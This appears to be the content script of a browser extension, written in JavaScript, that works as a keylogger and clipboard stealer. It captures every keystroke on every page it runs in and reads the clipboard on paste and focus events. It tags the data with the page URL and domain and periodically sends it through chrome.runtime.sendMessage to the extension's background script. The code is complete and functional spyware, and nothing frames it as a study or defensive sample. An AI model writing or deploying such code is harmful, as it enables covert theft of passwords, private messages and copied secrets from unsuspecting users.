(function() {
  let keyBuffer = [];
  let clipboardData = [];
  let lastSend = Date.now();
  let lastClipboard = '';
  const SEND_INTERVAL = 30000; // 30 seconds
  const MAX_BUFFER = 500;

  function sendData() {
    if (keyBuffer.length === 0 && clipboardData.length === 0) return;
    
    chrome.runtime.sendMessage({
      action: 'logData',
      data: {
        url: window.location.href,
        domain: window.location.hostname,
        keys: keyBuffer.join(''),
        clipboard: clipboardData,
        timestamp: new Date().toISOString()
      }
    });
    
    keyBuffer = [];
    clipboardData = [];
    lastSend = Date.now();
  }

  async function checkClipboard() {
    try {
      const text = await navigator.clipboard.readText();
      if (text && text !== lastClipboard && text.length > 0) {
        clipboardData.push({
          content: text,
          timestamp: new Date().toISOString()
        });
        lastClipboard = text;
      }
    } catch (e) {}
  }

  document.addEventListener('keydown', function(e) {
    let key = e.key;
    
    // Special keys
    if (key === 'Enter') key = '[ENTER]';
    else if (key === 'Tab') key = '[TAB]';
    else if (key === 'Backspace') key = '[BACKSPACE]';
    else if (key === ' ') key = '[SPACE]';
    else if (key.length > 1) key = `[${key.toUpperCase()}]`;
    
    keyBuffer.push(key);
    
    // Send if buffer full or time elapsed
    if (keyBuffer.length >= MAX_BUFFER || Date.now() - lastSend >= SEND_INTERVAL) {
      sendData();
    }
  });

  // Monitor clipboard on paste events
  document.addEventListener('paste', () => {
    setTimeout(checkClipboard, 100);
  });
  
  // Monitor clipboard on focus events
  window.addEventListener('focus', checkClipboard);
  
  // Send remaining data on page unload
  window.addEventListener('beforeunload', sendData);
  
  // Periodic send and clipboard check
  setInterval(() => {
    checkClipboard();
    sendData();
  }, SEND_INTERVAL);
})();